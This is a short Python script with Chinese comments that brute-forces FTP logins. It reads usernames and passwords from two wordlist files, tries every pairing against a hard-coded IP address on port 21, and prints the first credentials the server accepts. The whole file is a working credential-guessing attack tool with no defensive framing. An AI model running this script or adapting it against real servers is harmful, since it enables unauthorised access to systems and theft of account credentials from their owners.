# -*- coding:utf-8 -*-
# @Time :  19:38
# @Author : yangguoping
# @File : .py
# @software :
import ftplib

target = '42.193.214.112'
ftp = ftplib.FTP()
login = False  # 标识是否登录成功
with open(f"username.txt", mode='r', encoding='utf-8') as f:
    while True:
        name = f.readline().strip()  # 删除用户前缀空白符号
        if name == "":  # 判断用户是否读取完
            break
        with open(f"password.txt", 'r', encoding='utf-8') as f1:
            while True:
                passwd = f1.readline().strip()
                if passwd == '':
                    break
                # 开始与服务器建立连接
                try:
                    reply = ftp.connect(host=target, port=21, timeout=5)
                    if '220' in reply:
                        # print("连接成功")
                        try:
                            print(f"正在测试{name}和{passwd}爆破")

                            reply = ftp.login(name, passwd)

                            if '230' in reply:
                                print("登录成功")
                                print(f"账户：{name} 密码为{passwd}")
                                login = True
                                exit()
                        except:
                            print("")
                        ftp.close()
                except:
                    print("连接失败")
                    exit()

        if login == True:
            break
if login == False:
    print("破解失败")
ftp.close()
